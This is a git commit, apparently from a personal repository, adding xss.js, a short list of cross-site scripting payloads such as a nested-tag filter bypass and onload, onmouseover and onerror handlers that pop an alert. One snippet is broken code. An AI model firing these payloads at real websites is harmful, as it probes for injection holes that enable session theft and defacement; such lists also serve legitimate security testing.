d560ffd8d02555a11dc0629858c73e8601826477
ヒョードル <52812804+SniffSpoof@users.noreply.github.com>
2021-11-09 18:40:15 +0700

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,16 @@
+#-_-
+<scr<script>ipt>alert('JOPA')</scr<>ipt>
+#-_-
+<body onload="alert('JOPA')">
+#-_-
+<b onmouseover=alert('JOPA')>Click Me!</b>
+#-_-
+<img src="x" onerror="alert('JOPA')">
+#-_-
+<script>
+  function myFunction() {
+  document.getElementsByClassName(textarea).innerHTML = "JOPA";
+  }
+  </script>
+ #-_-
+<div><img src="" onerror="alert('JOPA')"/></div>
